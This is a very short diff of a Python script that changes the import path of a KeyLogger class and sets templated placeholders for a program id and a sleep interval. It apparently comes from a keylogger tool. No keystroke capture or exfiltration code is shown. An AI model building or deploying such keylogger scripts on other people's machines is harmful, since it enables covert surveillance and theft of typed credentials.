@@ -1,5 +1,5 @@
 #!/usr/bin/env python
-from libs.keylogger import KeyLogger
+from libs.keylogger.keylogger import KeyLogger
 
 program = '**p_id**'
 SLEEP = '**sleep**'
